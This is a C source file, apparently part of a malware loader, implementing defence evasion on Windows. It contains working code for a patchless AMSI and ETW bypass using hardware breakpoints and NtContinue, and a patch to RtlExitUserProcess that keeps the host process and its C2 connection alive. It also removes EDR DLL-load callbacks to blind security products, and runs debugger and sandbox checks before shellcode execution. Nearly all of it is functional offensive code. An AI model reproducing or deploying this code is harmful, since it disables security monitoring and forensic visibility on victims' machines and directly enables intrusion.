// =============================================
// Evasion.c - Patchless AMSI/ETW Bypass
//             (VEH + Hardware Breakpoints + NtContinue)
//             DLL Notification Callback Removal (EDR Blinding)
//             Anti-Analysis
//             Post-execution Cleanup
// =============================================

#include "Common.h"

// -----------------------------------------------
// Undocumented ntdll DLL notification structures
// Used by LdrRegisterDllNotification / LdrUnregisterDllNotification
// -----------------------------------------------
typedef NTSTATUS(NTAPI* fnLdrRegDllNotif)(ULONG Flags, PVOID Callback, PVOID Context, PVOID* Cookie);
typedef NTSTATUS(NTAPI* fnLdrUnregDllNotif)(PVOID Cookie);

typedef struct _LDR_DLL_NOTIF_ENTRY {
    LIST_ENTRY  List;
    PVOID       Callback;
    PVOID       Context;
} LDR_DLL_NOTIF_ENTRY, * PLDR_DLL_NOTIF_ENTRY;

// Dummy callback — registered to obtain a list entry, never fires
static VOID NTAPI DummyDllNotifCallback(ULONG Reason, PVOID Data, PVOID Ctx) {
    (void)Reason; (void)Data; (void)Ctx;
}

// Global target addresses for VEH handler
static PVOID g_pEtwEventWrite   = NULL;
static PVOID g_pAmsiScanBuffer  = NULL;

// VEH handle for cleanup
static PVOID g_hVeh = NULL;

// Guard flag: prevents infinite NtContinue loop
static volatile BOOL g_bHwBpSet = FALSE;

// -----------------------------------------------
// Vectored Exception Handler
// Catches STATUS_SINGLE_STEP (hardware breakpoint hit)
// and makes the target function "return" immediately
// without writing any bytes to code memory.
//
// EDR integrity checks see unmodified ntdll/amsi code.
// -----------------------------------------------
static LONG WINAPI HwBpVehHandler(PEXCEPTION_POINTERS pExInfo) {

    if (pExInfo->ExceptionRecord->ExceptionCode != STATUS_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    PCONTEXT ctx = pExInfo->ContextRecord;

    // EtwEventWrite hit -> return STATUS_SUCCESS (0)
    if (g_pEtwEventWrite && ctx->Rip == (ULONG_PTR)g_pEtwEventWrite) {
        ctx->Rax = 0;
        ctx->Rip = *(ULONG_PTR*)ctx->Rsp;
        ctx->Rsp += sizeof(ULONG_PTR);
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    // AmsiScanBuffer hit -> return E_INVALIDARG
    // Callers that check HRESULT will skip the scan result entirely
    if (g_pAmsiScanBuffer && ctx->Rip == (ULONG_PTR)g_pAmsiScanBuffer) {
        ctx->Rax = 0x80070057;  // E_INVALIDARG
        ctx->Rip = *(ULONG_PTR*)ctx->Rsp;
        ctx->Rsp += sizeof(ULONG_PTR);
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

// -----------------------------------------------
// Patchless AMSI/ETW Bypass
//
// Sets hardware breakpoints (DR0/DR1) on EtwEventWrite
// and AmsiScanBuffer using RtlCaptureContext + NtContinue.
//
// NtContinue sets debug registers without ETW-TI
// telemetry (unlike NtSetContextThread which is logged).
//
// VEH handler intercepts the breakpoint exceptions and
// makes the functions "return" with benign values.
//
// Zero bytes of code are modified — fully patchless.
// -----------------------------------------------
BOOL PatchlessAmsiEtw(IN PAPI_HASHING pApi) {

    // --- Resolve target function addresses ---

    BYTE xNtdll[] = XSTR_NTDLL_DLL;
    DEOBF(xNtdll);
    PVOID pNtdll = pApi->pGetModuleHandleA((LPCSTR)xNtdll);
    if (!pNtdll)
        return FALSE;

    BYTE xEtw[] = XSTR_ETW_EVENT_WRITE;
    DEOBF(xEtw);
    g_pEtwEventWrite = (PVOID)pApi->pGetProcAddress((HMODULE)pNtdll, (LPCSTR)xEtw);
    if (!g_pEtwEventWrite)
        return FALSE;

    BYTE xAmsiDll[] = XSTR_AMSI_DLL;
    DEOBF(xAmsiDll);
    HMODULE hAmsi = pApi->pLoadLibraryA((LPCSTR)xAmsiDll);
    if (!hAmsi)
        return FALSE;

    BYTE xAmsiFunc[] = XSTR_AMSI_SCAN_BUFFER;
    DEOBF(xAmsiFunc);
    g_pAmsiScanBuffer = (PVOID)pApi->pGetProcAddress(hAmsi, (LPCSTR)xAmsiFunc);
    if (!g_pAmsiScanBuffer)
        return FALSE;

    // --- Resolve VEH / Context APIs from ntdll ---

    BYTE xVeh[] = XSTR_RTL_ADD_VEH;
    DEOBF(xVeh);
    fnRtlAddVectoredExceptionHandler pRtlAddVeh =
        (fnRtlAddVectoredExceptionHandler)pApi->pGetProcAddress((HMODULE)pNtdll, (LPCSTR)xVeh);
    if (!pRtlAddVeh)
        return FALSE;

    BYTE xCapCtx[] = XSTR_RTL_CAPTURE_CTX;
    DEOBF(xCapCtx);
    fnRtlCaptureContext pRtlCaptureCtx =
        (fnRtlCaptureContext)pApi->pGetProcAddress((HMODULE)pNtdll, (LPCSTR)xCapCtx);
    if (!pRtlCaptureCtx)
        return FALSE;

    BYTE xNtCont[] = XSTR_NT_CONTINUE;
    DEOBF(xNtCont);
    fnNtContinue pNtContinue =
        (fnNtContinue)pApi->pGetProcAddress((HMODULE)pNtdll, (LPCSTR)xNtCont);
    if (!pNtContinue)
        return FALSE;

    // --- Register VEH (first handler in chain) ---

    g_hVeh = pRtlAddVeh(1, (PVOID)HwBpVehHandler);
    if (!g_hVeh)
        return FALSE;

    LOG("[+] Patchless: VEH registered");

    // --- Set hardware breakpoints via RtlCaptureContext + NtContinue ---
    // RtlCaptureContext captures the current thread context (including RIP).
    // We modify DR0/DR1/DR7 in the captured context and call NtContinue,
    // which restores the context with our debug register values and
    // resumes execution at the instruction after RtlCaptureContext.
    //
    // The guard flag g_bHwBpSet prevents the infinite loop:
    //   1st pass: g_bHwBpSet=FALSE -> set to TRUE, modify ctx, NtContinue
    //   2nd pass: g_bHwBpSet=TRUE  -> skip, fall through

    CONTEXT ctx;
    MemSet(&ctx, 0, sizeof(ctx));
    pRtlCaptureCtx(&ctx);

    if (!g_bHwBpSet) {
        g_bHwBpSet = TRUE;

        ctx.Dr0 = (ULONG_PTR)g_pEtwEventWrite;     // DR0 = EtwEventWrite
        ctx.Dr1 = (ULONG_PTR)g_pAmsiScanBuffer;    // DR1 = AmsiScanBuffer
        ctx.Dr7 = (1 << 0) | (1 << 2);             // L0 + L1: local enable, execute-on-1-byte

        ctx.ContextFlags |= CONTEXT_DEBUG_REGISTERS;
        pNtContinue(&ctx, FALSE);
        // Unreachable — NtContinue resumes at pRtlCaptureCtx's return point
    }

    LOG("[+] Patchless: HW breakpoints set (DR0=ETW, DR1=AMSI)");
    return TRUE;
}

// -----------------------------------------------
// Cleanup Evasion State
//
// Removes VEH handler and clears target addresses.
// Called before shellcode execution to reduce
// forensic footprint in memory.
// -----------------------------------------------
VOID CleanupEvasion(IN PAPI_HASHING pApi) {

    if (!g_hVeh || !pApi)
        return;

    // Resolve RtlRemoveVectoredExceptionHandler
    BYTE xNtdll[] = XSTR_NTDLL_DLL;
    DEOBF(xNtdll);
    PVOID pNtdll = pApi->pGetModuleHandleA((LPCSTR)xNtdll);
    if (!pNtdll)
        return;

    BYTE xRemVeh[] = XSTR_RTL_REMOVE_VEH;
    DEOBF(xRemVeh);
    fnRtlRemoveVectoredExceptionHandler pRtlRemoveVeh =
        (fnRtlRemoveVectoredExceptionHandler)pApi->pGetProcAddress(
            (HMODULE)pNtdll, (LPCSTR)xRemVeh);

    if (pRtlRemoveVeh)
        pRtlRemoveVeh(g_hVeh);

    // Clear hardware breakpoints via RtlCaptureContext + NtContinue
    // Reuse g_bHwBpSet (TRUE) as guard to prevent infinite NtContinue loop
    BYTE xCapCtx[] = XSTR_RTL_CAPTURE_CTX;
    DEOBF(xCapCtx);
    fnRtlCaptureContext pRtlCaptureCtx =
        (fnRtlCaptureContext)pApi->pGetProcAddress((HMODULE)pNtdll, (LPCSTR)xCapCtx);

    BYTE xNtCont[] = XSTR_NT_CONTINUE;
    DEOBF(xNtCont);
    fnNtContinue pNtContinue =
        (fnNtContinue)pApi->pGetProcAddress((HMODULE)pNtdll, (LPCSTR)xNtCont);

    if (pRtlCaptureCtx && pNtContinue && g_bHwBpSet) {
        CONTEXT ctx;
        MemSet(&ctx, 0, sizeof(ctx));
        pRtlCaptureCtx(&ctx);

        if (g_bHwBpSet) {
            g_bHwBpSet = FALSE;
            ctx.Dr0 = 0;
            ctx.Dr1 = 0;
            ctx.Dr7 = 0;
            ctx.ContextFlags |= CONTEXT_DEBUG_REGISTERS;
            pNtContinue(&ctx, FALSE);
        }
    }

    // Clear all evasion state
    g_hVeh             = NULL;
    g_pEtwEventWrite   = NULL;
    g_pAmsiScanBuffer  = NULL;
    g_bHwBpSet         = FALSE;

    LOG("[+] Evasion cleanup: VEH removed, debug registers cleared");
}

// -----------------------------------------------
// Exit Hook - Prevent Host Process Termination
//
// Patches RtlExitUserProcess in ntdll with an infinite
// PAUSE loop so that ExitProcess never completes.
//
// This prevents the ENTIRE exit flow:
//   - NtTerminateProcess(NULL)  — no thread killing
//   - LdrShutdownProcess()      — no DLL_PROCESS_DETACH
//   - NtTerminateProcess(-1)    — no process termination
//
// Without this, LdrShutdownProcess runs DLL_PROCESS_DETACH
// which cleans up winsock/winhttp state and kills C2 comms
// even if the process itself stays alive.
//
// Called from DllMain (Loader Lock safe: ntdll-only calls).
// -----------------------------------------------
typedef NTSTATUS(NTAPI* fnNtProtectVirtualMemory2)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

BOOL InstallExitHook(IN PVOID pNtdll) {

    if (!pNtdll)
        return FALSE;

    // Resolve RtlExitUserProcess (target to patch)
    PVOID pRtlExit = FetchExportAddress(pNtdll, RtlExitUserProcess_JOAAT);
    if (!pRtlExit)
        return FALSE;

    // Resolve NtProtectVirtualMemory (to make ntdll page writable)
    fnNtProtectVirtualMemory2 pNtProtect =
        (fnNtProtectVirtualMemory2)FetchExportAddress(pNtdll, NtProtectVirtualMemory_JOAAT);
    if (!pNtProtect)
        return FALSE;

    // Change page protection to RWX
    PVOID  pAddr = pRtlExit;
    SIZE_T sSize = 4;
    ULONG  dwOld = 0;
    NTSTATUS status = pNtProtect((HANDLE)-1, &pAddr, &sSize, PAGE_EXECUTE_READWRITE, &dwOld);
    if (!NT_SUCCESS(status))
        return FALSE;

    // Overwrite with: PAUSE; JMP $-2  (infinite low-CPU loop)
    // F3 90    = pause
    // EB FC    = jmp (RIP - 4) → back to pause
    PBYTE p = (PBYTE)pRtlExit;
    p[0] = 0xF3;   // pause
    p[1] = 0x90;
    p[2] = 0xEB;   // jmp short
    p[3] = 0xFC;   // offset = -4 (back to pause)

    // Restore original protection
    pAddr = pRtlExit;
    sSize = 4;
    pNtProtect((HANDLE)-1, &pAddr, &sSize, dwOld, &dwOld);

    return TRUE;
}

// -----------------------------------------------
// BlindDllNotifications
//
// Removes all registered DLL load/unload notification
// callbacks from ntdll's internal LdrpDllNotificationList.
//
// EDR products (CrowdStrike, SentinelOne, etc.) register
// callbacks via LdrRegisterDllNotification to monitor all
// DLL loads in the process. Removing them blinds the EDR
// to subsequent LoadLibrary calls (wininet, ktmw32, amsi).
//
// Approach (rad9800 technique):
//   1. Register a dummy callback to get a list entry (cookie)
//   2. Walk the doubly-linked list from our entry
//   3. Find the list head (sentinel node inside ntdll's address range)
//   4. Unlink all other entries (EDR callbacks)
//   5. Unregister our dummy callback (now safe: list is head <-> ours)
//
// After this, no callbacks fire on DLL load/unload events.
// -----------------------------------------------
BOOL BlindDllNotifications(IN PAPI_HASHING pApi) {

    // --- Resolve ntdll ---
    BYTE xNtdll[] = XSTR_NTDLL_DLL;
    DEOBF(xNtdll);
    HMODULE hNtdll = pApi->pGetModuleHandleA((LPCSTR)xNtdll);
    if (!hNtdll)
        return FALSE;

    // --- Get ntdll image size for address range check ---
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    ULONG_PTR uNtdllStart = (ULONG_PTR)hNtdll;
    ULONG_PTR uNtdllEnd   = uNtdllStart + pNt->OptionalHeader.SizeOfImage;

    // --- Resolve LdrRegisterDllNotification ---
    BYTE xReg[] = XSTR_LDR_REG_DLL_NOTIF;
    DEOBF(xReg);
    fnLdrRegDllNotif pLdrRegister =
        (fnLdrRegDllNotif)pApi->pGetProcAddress(hNtdll, (LPCSTR)xReg);

    // --- Resolve LdrUnregisterDllNotification ---
    BYTE xUnreg[] = XSTR_LDR_UNREG_DLL_NOTIF;
    DEOBF(xUnreg);
    fnLdrUnregDllNotif pLdrUnregister =
        (fnLdrUnregDllNotif)pApi->pGetProcAddress(hNtdll, (LPCSTR)xUnreg);

    if (!pLdrRegister || !pLdrUnregister)
        return FALSE;

    // --- Register dummy callback to obtain a list entry ---
    PVOID pCookie = NULL;
    NTSTATUS status = pLdrRegister(0, (PVOID)DummyDllNotifCallback, NULL, &pCookie);
    if (!NT_SUCCESS(status) || !pCookie)
        return FALSE;

    // Cookie = our LDR_DLL_NOTIF_ENTRY in the notification list
    PLDR_DLL_NOTIF_ENTRY pOurEntry = (PLDR_DLL_NOTIF_ENTRY)pCookie;

    // --- Walk list to find the head (sentinel node inside ntdll) ---
    // The list head (LdrpDllNotificationList) is a static LIST_ENTRY
    // in ntdll's .data section. All callback entries are heap-allocated
    // (outside ntdll's address range). We identify the head by checking
    // if the LIST_ENTRY address falls within ntdll's image.

    PLIST_ENTRY pListHead = NULL;
    PLIST_ENTRY pWalk = pOurEntry->List.Flink;

    while (pWalk != &pOurEntry->List) {
        if ((ULONG_PTR)pWalk >= uNtdllStart && (ULONG_PTR)pWalk < uNtdllEnd) {
            pListHead = pWalk;
            break;
        }
        pWalk = pWalk->Flink;
    }

    if (!pListHead) {
        // Couldn't find list head — unregister our callback and bail
        pLdrUnregister(pCookie);
        return FALSE;
    }

    // --- Unlink all entries except list head and ours ---
    // After this, only our dummy callback remains in the list.
    // All EDR callbacks are disconnected and will never fire again.

    PLIST_ENTRY pCurrent = pListHead->Flink;
    while (pCurrent != pListHead) {
        PLIST_ENTRY pNext = pCurrent->Flink;
        if (pCurrent != &pOurEntry->List) {
            // Unlink EDR callback: prev.Flink = next, next.Blink = prev
            pCurrent->Blink->Flink = pCurrent->Flink;
            pCurrent->Flink->Blink = pCurrent->Blink;
        }
        pCurrent = pNext;
    }

    // --- Unregister our dummy callback (safe: list is now head <-> ours) ---
    pLdrUnregister(pCookie);

    LOG("[+] DLL notification callbacks removed (EDR blinded)");
    return TRUE;
}

// -----------------------------------------------
// Anti-Analysis Checks
// Returns TRUE if environment is clean
// -----------------------------------------------
BOOL AntiAnalysis(VOID) {

    PPEB2 pPeb = (PPEB2)__readgsqword(0x60);
    if (!pPeb)
        return FALSE;

    // 1. Check PEB->BeingDebugged
    if (pPeb->BeingDebugged)
        return FALSE;
    // 2. Check NtGlobalFlag
    if (pPeb->NtGlobalFlag & 0x70)
        return FALSE;

    // 3. Check number of processors (sandboxes often have 1)
    if (pPeb->NumberOfProcessors < 2)
        return FALSE;

    // 4. Timing check
    ULONGLONG tsc1 = __rdtsc();
    volatile int dummy = 0;
    for (int i = 0; i < 100; i++) dummy += i;
    ULONGLONG tsc2 = __rdtsc();

    if ((tsc2 - tsc1) > 10000000)
        return FALSE;

    return TRUE;
}
